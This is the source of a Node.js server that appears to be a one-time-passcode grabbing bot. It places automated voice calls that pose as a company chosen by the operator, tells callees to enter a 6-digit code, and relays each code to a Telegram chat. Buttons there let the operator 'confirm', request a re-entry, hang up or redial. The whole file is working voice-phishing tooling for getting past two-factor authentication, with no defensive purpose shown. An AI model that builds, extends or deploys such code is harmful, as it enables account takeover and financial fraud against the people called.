const express=require("express")
const fetch=require("node-fetch")
const bodyParser=require("body-parser")

const app=express()
app.use(bodyParser.urlencoded({extended:false}))
app.use(bodyParser.json())

/* ENV */
const SW_PROJECT=process.env.SW_PROJECT
const SW_TOKEN=process.env.SW_TOKEN
const SW_SPACE=process.env.SW_SPACE
const SW_NUMBER=process.env.SW_NUMBER
const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
const CHAT_ID=process.env.CHAT_ID
const BASE_URL=process.env.BASE_URL

/* AUTH */
function auth(){
return "Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64")
}

/* SETTINGS */
let settings={
company:"Support",
digits:6,
assistant:0
}

const assistants=[
{voice:"Polly.Joanna"},
{voice:"Polly.Matthew"},
{voice:"Polly.Amy"},
{voice:"Polly.Brian"},
{voice:"Polly.Justin"},
{voice:"Polly.Kendra"}
]

/* STATE */
let activeCallSid=null
let activeCaller=null
let activeCode=null
let callStart=null
let lastCaller=null
let logs=[]

function log(x){
logs.unshift(new Date().toLocaleTimeString()+" "+x)
logs=logs.slice(0,20)
}

/* TELEGRAM SEND */
async function tgSend(text,buttons){
let body={
chat_id:CHAT_ID,
text:text
}

if(buttons){
body.reply_markup={inline_keyboard:buttons}
}

await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify(body)
})
}

/* PANEL */
async function updatePanel(){

let status="No active call"

if(activeCallSid){
let secs=Math.floor((Date.now()-callStart)/1000)
status=`Active call
Caller: ${activeCaller}
Code: ${activeCode||"waiting"}
Time: ${secs}s`
}

let text=
`📞 IVR Control Panel

${status}

Company: ${settings.company}
Digits: ${settings.digits}
Assistant: ${settings.assistant+1}`

await tgSend(text,[
[
{text:"✔ Confirm",callback_data:"confirm"},
{text:"🔁 Retry",callback_data:"retry"}
],
[
{text:"⛔ Hang Up",callback_data:"hangup"}
],
[
{text:"📞 Call Last",callback_data:"calllast"}
],
[
{text:"📊 Status",callback_data:"status"},
{text:"📜 Logs",callback_data:"logs"}
]
])
}

/* CALL LAST */
async function startCall(number){

if(!number)return

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`,{
method:"POST",
headers:{
Authorization:auth(),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({
From:SW_NUMBER,
To:number,
Url:`${BASE_URL}/ivr`
})
})

tgSend("📞 Calling "+number)
}

/* IVR START */
app.post("/ivr",(req,res)=>{

res.type("text/xml")

res.send(`
<Response>
<Say voice="${assistants[settings.assistant].voice}">
Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
</Say>
<Gather numDigits="${settings.digits}" action="/code"/>
</Response>
`)
})

/* CODE RECEIVED */
app.post("/code",async(req,res)=>{

const digits=req.body.Digits
const caller=req.body.From
const sid=req.body.CallSid

activeCallSid=sid
activeCaller=caller
activeCode=digits
callStart=Date.now()

lastCaller=caller

log("Code received "+digits)

await tgSend(`📞 CODE RECEIVED

Caller: ${caller}
Code: ${digits}`,[
[
{text:"✔ Confirm",callback_data:"confirm"},
{text:"🔁 Retry",callback_data:"retry"}
],
[
{text:"⛔ Hang Up",callback_data:"hangup"}
]
])

await updatePanel()

res.type("text/xml")

res.send(`
<Response>
<Say voice="${assistants[settings.assistant].voice}">
Please wait while we verify your code.
</Say>
<Redirect>${BASE_URL}/hold</Redirect>
</Response>
`)
})

/* HOLD LOOP */
app.post("/hold",(req,res)=>{

res.type("text/xml")

res.send(`
<Response>
<Pause length="10"/>
<Redirect>${BASE_URL}/hold</Redirect>
</Response>
`)
})

/* TELEGRAM WEBHOOK */
app.post("/telegram",async(req,res)=>{

const update=req.body

/* BUTTON */
if(update.callback_query){

const action=update.callback_query.data

if(action==="confirm"){

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
method:"POST",
headers:{
Authorization:auth(),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({
Twiml:`
<Response>
<Say voice="${assistants[settings.assistant].voice}">
Thank you. Your code has been confirmed. Have a great day.
</Say>
<Hangup/>
</Response>
`
})
})

log("Confirmed")

activeCallSid=null
activeCode=null
callStart=null

tgSend("✔ Code confirmed")
updatePanel()
}

if(action==="retry"){

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
method:"POST",
headers:{
Authorization:auth(),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({
Twiml:`
<Response>
<Say voice="${assistants[settings.assistant].voice}">
Please re-enter your code.
</Say>
<Gather numDigits="${settings.digits}" action="/code"/>
</Response>
`
})
})

log("Retry requested")

tgSend("🔁 Asked caller to re-enter code")
}

if(action==="hangup"){

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
method:"POST",
headers:{
Authorization:auth(),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({
Twiml:`<Response><Hangup/></Response>`
})
})

log("Call ended")

activeCallSid=null
activeCode=null
callStart=null

tgSend("⛔ Call ended")
updatePanel()
}

if(action==="calllast"){
startCall(lastCaller)
}

if(action==="status"){
updatePanel()
}

if(action==="logs"){
let t="📜 Logs\n\n"
logs.forEach(l=>t+=l+"\n")
tgSend(t)
}

}

/* COMMANDS */
if(update.message){

const text=update.message.text

if(text.startsWith("/digits")){
const d=parseInt(text.split(" ")[1])
if(d>=2&&d<=10){
settings.digits=d
tgSend("Digits set to "+d)
updatePanel()
}
}

if(text.startsWith("/assistant")){
const a=parseInt(text.split(" ")[1])
if(a>=1&&a<=assistants.length){
settings.assistant=a-1
tgSend("Assistant set to "+a)
updatePanel()
}
}

if(text.startsWith("/company")){
settings.company=text.replace("/company ","")
tgSend("Company name updated")
updatePanel()
}

if(text==="/panel"){
updatePanel()
}

}

res.sendStatus(200)
})

/* ROOT */
app.get("/",(req,res)=>{
res.send("Server running")
})

/* SERVER */
const PORT=process.env.PORT||3000
app.listen(PORT,()=>console.log("Server started"))
